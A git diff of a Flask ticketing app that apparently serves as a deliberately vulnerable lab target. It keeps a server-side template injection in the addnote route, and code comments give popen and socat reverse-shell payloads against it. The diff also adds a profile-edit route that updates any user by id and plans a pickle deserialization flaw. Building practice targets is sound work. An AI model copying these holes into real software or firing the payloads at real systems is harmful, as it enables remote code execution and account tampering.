@@ -20,16 +20,10 @@ from werkzeug.security import generate_password_hash
 from werkzeug.exceptions import HTTPException
 from werkzeug.utils import secure_filename
 from functools import wraps
-from .forms import AttachmentForm, LoginForm, RegisterForm, TicketForm
+from .forms import AttachmentForm, LoginForm, ProfileForm, RegisterForm, TicketForm
 from .models import User, Post
 from . import db
 from . import login_manager
-
-
-# TODO: separate out routes
-# ticket routes
-# user routes
-# admin routes
 
 
 @app.route("/home", methods=["GET"])
@@ -43,12 +37,11 @@ def home():
 
 @app.route("/register", methods=["GET", "POST"])
 def register():
-    form = (
-        RegisterForm()
-    )  # should this go below if user is auth'd so it isn't created early
+
     if current_user.is_authenticated:
         return redirect(url_for(".home"))
 
+    form = RegisterForm()
     if request.method == "POST":
         if form.validate_on_submit():
             email = request.form.get("email")
@@ -137,9 +130,9 @@ def unauthorized():
 @app.route("/logout")
 @login_required
 def logout():
-    # TODO: add some sort of message or redirect to logout/login page with note?
     logout_user()
-    return redirect(url_for(".home"))
+    flash("You are now logged out. Thanks!")
+    return redirect(url_for(".login"))
 
 
 @app.route("/profile", methods=["GET", "POST"])
@@ -168,6 +161,26 @@ def profile():
     else:
         flash("Method not allowed!")
         return redirect(url_for(".profile"))
+
+
+@app.route("/profile/edit/<id>", methods=["GET", "POST"])
+@login_required
+def edit_profile(id):
+    form = ProfileForm()
+    if request.method == "GET":
+        return render_template("editprofile.html", form=form)
+
+    if request.method == "POST":
+        if request.form['submit'] == "Cancel":
+            return redirect(url_for(".profile"))
+        if form.validate_on_submit():
+            body = request.form.get("body")
+            user = User.query.get(id)
+            user.info = body
+            db.session.commit()
+
+        return redirect(url_for(".profile"))
+
 
 
 @app.route("/posts", methods=["GET"])
@@ -210,40 +223,34 @@ def create():
 @app.route("/attach/<id>", methods=["GET", "POST"])
 @login_required
 def attach(id):
-    # TODO: no csrf here? should we use this for a vuln?
     if request.method == "GET":
-        form = AttachmentForm("attach file")
+        form = AttachmentForm()
         return render_template("attach.html", form=form, id=id)
+    # TODO: CSRF check?
     elif request.method == "POST":
-        print(request.data)
         if not current_user.isadmin:
-            print("user not admin")
+            flash("MuSt bE aDmIn!")
             return
         else:
             file = request.files["file"]
 
             if file.filename == "":
                 flash("No file selected!")
-                return redirect(url_for(".attach"))
+                return redirect(url_for(".posts"))
 
             if file and allowed_file(file.filename):
-                # TODO: Vuln, secure_filename sanitizes, see
-                # https://flask.palletsprojects.com/en/2.0.x/patterns/fileuploads/
                 filename = secure_filename(file.filename)
                 filepath = os.path.join(app.config["ATTACHMENTS_DIR"], filename)
 
-                # TODO: check if file already exists, or it will overwrite the previous one
                 if os.path.isfile(filepath):
                     flash("file already exists")
-                    return redirect(url_for("."))
+                    return redirect(url_for(".posts"))
                 else:
                     file.save(filepath)
 
-                # update post in the database
                 post = Post.query.get(id)
                 post.attachment = filepath
                 db.session.commit()
-
                 return redirect(url_for(".posts"))
             else:
                 return redirect(url_for(".posts"))
@@ -259,26 +266,16 @@ def archive(id):
     if request.method == "GET":
         return redirect(url_for(".posts"))
     else:
-        # testing archiving and then testing loading pickled posts
-        # should i json encode it? https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/
-        # why would this be done irl
         post = Post.query.get(id)
-        # adds id at the end for realism? and making it hard to depickle, but it 
-        # won't work like that I think
-        #         data = base64.urlsafe_b64encode(pickle.dumps(post.body + str(post.id)))
-        # not dumping as an unsafe class just a file
-        #data = base64.urlsafe_b64encode(pickle.dumps(post.body))
         data = pickle.dumps(post.body)
-
         filename = id + ".pickle"
-        
         filepath = os.path.join(app.config["ATTACHMENTS_DIR"], filename)
         try:
             f = open(filepath, "wb")
             f.write(data)
             f.close()
             flash("Ticket archived!")
-            
+
             try:
                 Post.query.filter_by(id=id).delete()
                 db.session.commit()
@@ -292,12 +289,6 @@ def archive(id):
             print(e)
             return redirect(url_for(".posts"))
 
-        # load to trigger vuln, put this in other app
-        # f = open(filepath, "rb")
-        # pickle.loads(base64.b64decode(f.read()))
-
-        return redirect(url_for(".posts"))
-
 
 @app.route("/restore/<id>", methods=["GET"])  # or post or ?
 @login_required
@@ -307,25 +298,27 @@ def restore(id):
     this is where we could instroduce json depickling
     vulnerability
     """
-    return render_template(url_for(".posts"))
+    return redirect(url_for(".posts"))
+
 
 # todo change this route to something that won't be found with gobuster et al
+# so they have to do code review to find it
 @app.route("/addnote/<id>/<note>", methods=["GET", "POST"])
 @login_required
 def addnote(id, note):
-    """  create a template for this page """
+    """create a template for this page"""
     if not current_user.isadmin:
         # TODO: update this to render a different template?
         print("user not admin")
         flash("you must be admin to do this!")
-        return render_template(url_for(".posts"))
+        return redirect(url_for(".posts"))
 
     if request.method == "GET":
         # TODO: do some sanitization here
         # note = "{{request.application.__globals__.__builtins__.__import__('os').popen('cd ~; ls').read()}}"
         # TODO: This is SSTI location for www-data shell
         # TODO: add this to db then?
-        # rev shell 
+        # rev shell
         # http://127.0.0.1:5000/addnote/1/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('socat%20exec:%22bash%20-li%22,pty,stderr,setsid,sigint,sane%20tcp:127.0.0.1:4444').read()%7D%7D
         return render_template_string(f"<h1>Added Note to Ticket: {id}<h1><p>{note}")
 
